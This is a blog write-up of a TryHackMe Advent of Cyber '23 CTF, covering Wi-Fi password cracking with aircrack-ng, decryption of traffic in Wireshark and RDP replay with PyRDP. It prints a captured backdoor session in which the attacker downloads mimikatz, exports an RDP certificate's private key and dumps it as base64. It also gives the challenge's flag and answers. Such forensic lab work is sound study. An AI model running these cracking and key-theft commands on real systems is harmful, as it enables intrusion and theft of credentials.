---
layout: post
author: nIIk
title: "THM Advent of Cyber '23 Side Quest 1 -- The Return of the Yeti"
date: 2023-12-28 00:01
keywords: "THM, TryHackMe, Advent of Cyber, christmas, 2023, Wireshark, RDP, Remote Desctop, RDP-Replay, WiFi, Brute-Force"
categories: [THM]
tags: [CTF, THM, Wireshark, WiFi]
---
## Introduction

"The Return of the Yeti" is a free, **hard** THM challenge, part of the [Advent of Cyber '23 Side Quest](https://tryhackme.com/room/adventofcyber23sidequest) event. This Room is the first of four. During the AoC 23 event, the access to the room had to be gained via a key. The way to obtain the key is covered [here](/posts/thm_aoc_23_sq#first-side-quest-challenge-key). The challenge is based on a PCAP file. The tools used to complete the room are [Wireshark](https://www.wireshark.org/), [Aircrack-ng](https://aircrack-ng.org/) and [PyRDP](https://github.com/GoSecure/pyrdp).

## Initial Analysis

Before even opening the file, we can see that The Yeti has provided us with sensitive information which would be usefull later.

>Van Spy's got a hunch this intern's a bit of a slacker, so crackin' the password was a breeze. **"BFC123"**, and we're in. He planted a sneaky backdoor and even snagged some WiFi chit-chat thinkin' it might come in handy.

Moving to the file, after the file is opened in Wireshark, we are greeded by encrypted Wi-Fi traffic from network with SSID **"FreeWifiBFC"**.

> What's the name of the WiFi network in the PCAP?
>- [x] FreeWifiBFC
{: .prompt-info }

![WiFi Traffic](blog/thm/aoc_23_room1/wifi_ssid.png)

## Decrypting the Wi-Fi Traffic

Now, as we know we are dealing with encrypted Wi-Fi traffic, we can try to crack the password. In order to do that, we need the password hash captured in the PCAP file. Usually, the hash should be there if any successful Three-Way Handshakes have taken place during the packet capture.

We can see that by navigating to `Wireless -> WLAN Traffic`. If the count of the Auths on the desired SSID is above 0, that means there should be a  hash.

![WiFi Auth](blog/thm/aoc_23_room1/wifi_auth.png)

Now that we know that we can get the password, we need to export the file from PCAPNG to PCAP. To do that via Wireshark, we can navigate to `File -> Save As...` and select TCPDUMP PCAP from the "Save As" drop-down menu.

![WiFi PCAP](blog/thm/aoc_23_room1/wifi_pcap.png)

An alternative way of doing it is via the following Tcpdump command:

```shell
tcpdump -r VanSpy.pcapng -w VanSpy.pcap
```

And finally, we can use Aircrack-ng to crack the password. The arguments that are needed are:

- Wordlist
- BSSID
- PCAP File

```shell
aircrack-ng -w ./rockyou.txt -b 22:c7:12:c7:e2:35 VanSpy.pcap
```

>The BSSID is equal to the Source MAC Address of the network which can be seen in Wireshark.
{: .prompt-tip }

The output of the command does indeed return the password:

```shell
                               Aircrack-ng 1.7 

      [00:00:03] 34295/14344391 keys tested (11764.90 k/s) 

      Time left: 20 minutes, 16 seconds                          0.24%

                           KEY FOUND! [ Christmas ]


      Master Key     : A8 3F 1D 1D 1D 1F 2D 06 8E D4 47 CE E9 FD 3A AA 
                       B2 86 42 89 FA F8 49 93 D7 C1 A0 29 97 3D 44 9F 

      Transient Key  : 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 
                       00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 
                       00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 
                       00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 

      EAPOL HMAC     : C1 0A 70 D9 65 94 5B 57 F2 98 8A E0 FC FD 2B 22
```

>What's the password to access the WiFi network?
>- [x] Christmas
{: .prompt-info }

Now that we have the password, we need to insert it in Wireshark. To do so, we can navigate to `Edit -> Preferences`. Then, open the `IEEE 802.11` menu under the `Protocols` header, and select `Edit`. Press on the `+` to enter a new key, choose `wpa-pwd` as a type and enter the password and the SSID separated by **:** (`Christmas:FreeWifiBFC`).

![WiFi PCAP](blog/thm/aoc_23_room1/wifi_passwd.png)

## Decrypted Network Traffic Analysis

Now that we have decrypted network traffic, we can have a look at the statistics and the exchanged packets.  
After navigating to `Statistics -> Conversations`, we can see that most of the packets are exchanged on ports **3389** and **4444**.

The traffic on port 3389 is encrypted. However, we can see that it's RDP traffic to `INTERN-PC0` from user (mstshash) `elf`.

![RDP 1](blog/thm/aoc_23_room1/pcap_rdp_1.png)

Port 4444, on the other hand, shows us the traffic from Van Spy's backdoor. Below is the export on TCP Stream 1005.

```powershell
Windows PowerShell running as user Administrator on INTERN-PC
Copyright (C) Microsoft Corporation. All rights reserved.



PS C:\Users\Administrator> PS C:\Users\Administrator> 
PS C:\Users\Administrator> dir


    Directory: C:\Users\Administrator


Mode                LastWriteTime         Length Name                                             
----                -------------         ------ ----                                             
d-----       11/23/2023   9:47 PM                .ssh                                             
d-r---        3/17/2021   3:13 PM                3D Objects                                       
d-r---        3/17/2021   3:13 PM                Contacts                                         
d-r---       11/25/2023   2:12 PM                Desktop                                          
d-r---        3/17/2021   3:13 PM                Documents                                        
d-r---       11/24/2023  10:53 PM                Downloads                                        
d-r---        3/17/2021   3:13 PM                Favorites                                        
d-r---        3/17/2021   3:13 PM                Links                                            
d-r---        3/17/2021   3:13 PM                Music                                            
d-r---       11/24/2023  10:44 PM                Pictures                                         
d-r---        3/17/2021   3:13 PM                Saved Games                                      
d-r---        3/17/2021   3:13 PM                Searches                                         
d-r---        3/17/2021   3:13 PM                Videos                                           
-a----       11/25/2023   6:01 AM           8192 psh4444.exe                                      


PS C:\Users\Administrator> whoami
intern-pc\administrator
PS C:\Users\Administrator> wget https://github.com/gentilkiwi/mimikatz/releases/download/2.2.0-20220919/mimikatz_trunk.zip -O mimi.zip
PS C:\Users\Administrator> Expand-Archive .\mimi.zip
PS C:\Users\Administrator> mv mimi/x64/mimikatz.exe .
PS C:\Users\Administrator> cmd /c mimikatz.exe privilege::debug token::elevate crypto::capi "crypto::certificates /systemstore:LOCAL_MACHINE /store:\`"Remote Desktop\`" /export" exit

  .#####.   mimikatz 2.2.0 (x64) #19041 Sep 19 2022 17:44:08
 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
 ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
 ## \ / ##       > https://blog.gentilkiwi.com/mimikatz
 '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
  '#####'        > https://pingcastle.com / https://mysmartlogon.com ***/

mimikatz(commandline) # privilege::debug
Privilege '20' OK

mimikatz(commandline) # token::elevate
Token Id  : 0
User name : 
SID name  : NT AUTHORITY\SYSTEM

496	{0;000003e7} 1 D 16529     	NT AUTHORITY\SYSTEM	S-1-5-18	(04g,21p)	Primary
 -> Impersonated !
 * Process Token : {0;0002bbfa} 2 D 25564822  	INTERN-PC\Administrator	S-1-5-21-1966530601-3185510712-10604624-500	(14g,24p)	Primary
 * Thread Token  : {0;000003e7} 1 D 25609341  	NT AUTHORITY\SYSTEM	S-1-5-18	(04g,21p)	Impersonation (Delegation)

mimikatz(commandline) # crypto::capi
Local CryptoAPI RSA CSP patched
Local CryptoAPI DSS CSP patched

mimikatz(commandline) # crypto::certificates /systemstore:LOCAL_MACHINE /store:"Remote Desktop" /export
 * System Store  : 'LOCAL_MACHINE' (0x00020000)
 * Store         : 'Remote Desktop'

 0. INTERN-PC
    Subject  : CN=INTERN-PC
    Issuer   : CN=INTERN-PC
    Serial   : ffb1d93a1df0324cadd5e13f3f9f1b51
    Algorithm: 1.2.840.113549.1.1.1 (RSA)
    Validity : 11/22/2023 9:18:19 PM -> 5/23/2024 9:18:19 PM
    Hash SHA1: a0168513fd57577ecc0204f01441a3bd5401ada7
	Key Container  : TSSecKeySet1
	Provider       : Microsoft Enhanced Cryptographic Provider v1.0
	Provider type  : RSA_FULL (1)
	Type           : AT_KEYEXCHANGE (0x00000001)
	|Provider name : Microsoft Enhanced Cryptographic Provider v1.0
	|Key Container : TSSecKeySet1
	|Unique name   : f686aace6942fb7f7ceb231212eef4a4_c5d2b969-b61a-4159-8f78-6391a1c805db
	|Implementation: CRYPT_IMPL_SOFTWARE ; 
	Algorithm      : CALG_RSA_KEYX
	Key size       : 2048 (0x00000800)
	Key permissions: 0000003b ( CRYPT_ENCRYPT ; CRYPT_DECRYPT ; CRYPT_READ ; CRYPT_WRITE ; CRYPT_MAC ; )
	Exportable key : NO
	Public export  : OK - 'LOCAL_MACHINE_Remote Desktop_0_INTERN-PC.der'
	Private export : OK - 'LOCAL_MACHINE_Remote Desktop_0_INTERN-PC.pfx'


mimikatz(commandline) # exit
Bye!
PS C:\Users\Administrator> dir


    Directory: C:\Users\Administrator


Mode                LastWriteTime         Length Name                                             
----                -------------         ------ ----                                             
d-----       11/23/2023   9:47 PM                .ssh                                             
d-r---        3/17/2021   3:13 PM                3D Objects                                       
d-r---        3/17/2021   3:13 PM                Contacts                                         
d-r---       11/25/2023   2:12 PM                Desktop                                          
d-r---        3/17/2021   3:13 PM                Documents                                        
d-r---       11/24/2023  10:53 PM                Downloads                                        
d-r---        3/17/2021   3:13 PM                Favorites                                        
d-r---        3/17/2021   3:13 PM                Links                                            
d-----       11/25/2023   2:56 PM                mimi                                             
d-r---        3/17/2021   3:13 PM                Music                                            
d-r---       11/24/2023  10:44 PM                Pictures                                         
d-r---        3/17/2021   3:13 PM                Saved Games                                      
d-r---        3/17/2021   3:13 PM                Searches                                         
d-r---        3/17/2021   3:13 PM                Videos                                           
-a----       11/25/2023   2:56 PM            730 LOCAL_MACHINE_Remote Desktop_0_INTERN-PC.der     
-a----       11/25/2023   2:56 PM           2493 LOCAL_MACHINE_Remote Desktop_0_INTERN-PC.pfx     
-a----       11/25/2023   2:56 PM        1206166 mimi.zip                                         
-a----        9/19/2022   4:44 PM        1355264 mimikatz.exe                                     
-a----       11/25/2023   6:01 AM           8192 psh4444.exe                                      


PS C:\Users\Administrator> [Convert]::ToBase64String([IO.File]::ReadAllBytes("/users/administrator/LOCAL_MACHINE_Remote Desktop_0_INTERN-PC.pfx"))
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
PS C:\Users\Administrator> exit
```

>What suspicious tool is used by the attacker to extract a juicy file from the server?
>- [x] mimikatz
{: .prompt-info }

"Luckily" for us, Van Spy has exported the Remote Desctop PFX file, which we can use to decrypt the RDP traffic.

## Decrypting the RDP Traffic

In order to decrypt the RDP traffic, we need to export the private key from the PFX pair. To accomplish this, we must first save the PFX file in the appropriate format. For example, if we copy the content from Wireshark and place it in a file named `rdp.pfx.b64`, we must then convert it back to its original state from Base64. To achieve this, we can use the following command:

```shell
base64 -d rdp.pfx.b64 > rdp.pfx
```

Then, we can confirm that the file is valid by using the following command:

```shell
openssl pkcs12 -info -in rdp.pfx
```

>The first (PFX) password is the default mimikatz password: `mimikatz`  
>The second (PEM) password is the user's password which was provided to us by the Yeti: `BFC123`
{: .prompt-tip }

Now that we know that we have a valid PFX file, we can extract and decrypt the private key:

- Extract the Private Key

```shell
openssl pkcs12 -in rdp.pfx -nocerts -out rdp.key
```

- Decrypt the Private Key

```shell
openssl rsa -in rdp.key -out dcp_rdp.key
```

And finally, we can insert the key in the _"Preference"_ tab, in the `TLS` menu:

![RDP 2](blog/thm/aoc_23_room1/pcap_rdp_2.png)

Now, we can confirm we have decrypted the traffic successfully by applying the following filter and confirming that we can see the Client Details:

```
rdp.client.address == 10.0.0.2
```
{: file="Wireshark"}

![RDP 3](blog/thm/aoc_23_room1/pcap_rdp_3.png)

## RDP-Replay

Unfortunately, we can't just press "Follow TCP Stream" and review the information exchanged through RDP due to the nature of the protocol. That being said, we can perform RDP-Replay. To do so, I've used PyRDP ([https://github.com/GoSecure/pyrdp](https://github.com/GoSecure/pyrdp)).

Apart from cloning and installing the tool from the repository, we also need to export the Layer 7 PDUs from the current PCAPNG file. To do so, we can navigate to `File -> Export PDUs... -> OSI Layer 7 -> Save As...` (make sure you save the file as PCAP).

![RDP 4](blog/thm/aoc_23_room1/pcap_rdp_4.png)

Now, we can try to convert our PDU export into a RDP-Replay video. To do so, we need to run the RDP Converted and specify the export PCAP file as an argument.

```shell
(venv)[nick@tuf504]─[~/pyrdp] python bin/pyrdp-convert.py rdp.pcap

[*] Analyzing PCAP 'rdp.pcap' ...
    - 10.0.0.2:55510 -> 10.1.1.1:3389 : plaintext
[*] Processing 10.0.0.2:55510 -> 10.1.1.1:3389
 42% (3118 of 7405) |#######################                                | Elapsed Time: 0:00:01 ETA:   0:00:01
[-] Failed to handle data, continuing anyway: unpack requires a buffer of 4 bytes
 70% (5197 of 7405) |######################################                 | Elapsed Time: 0:00:01 ETA:   0:00:00
[-] Failed to handle data, continuing anyway: unpack requires a buffer of 4 bytes
 97% (7211 of 7405) |#####################################################  | Elapsed Time: 0:00:02 ETA:   0:00:00
[-] Failed to handle data, continuing anyway: Trying to parse unknown MCS PDU type 12
100% (7405 of 7405) |#######################################################| Elapsed Time: 0:00:02 Time:  0:00:02

[+] Successfully wrote '20231125145052_10.0.0.2:55510-10.1.1.1:3389.pyrdp'
```

Now having the video is saved, we can open the RDP Player and see all actions performed during the RDP session.

```shell
python bin/pyrdp-player.py
```

![RDP Replay 1](blog/thm/aoc_23_room1/rdp_1.png)

>What is the case number assigned by the CyberPolice to the issues reported by McSkidy?
>- [x] 31337-0
{: .prompt-info }

![RDP Replay 2](blog/thm/aoc_23_room1/rdp_2.png)

>What is the content of the `yetikey1.txt` file?
>- [x] 1-1f9548f131522e85ea30e801dfd9b1a4e526003f9e83301faad85e6154ef2834
{: .prompt-info }

## Conclusion

This challenge covered Wi-Fi password cracking, PCAP network analysis, and RDP traffic analysis. Overall, I found the challenge to be a lot of fun and I learned a great deal. 

If you're interested in learning how to obtain the Event Key for this room, you can find my write-up on it [here](/posts/thm_aoc_23_sq_adv3nt0fdbopsjcap/).

Additionally, if you're looking for a guide on how to solve the Second Sidequest Room, you can also check out my write-up on it [here](/posts/thm_aoc_23_sq_armageddon2r/).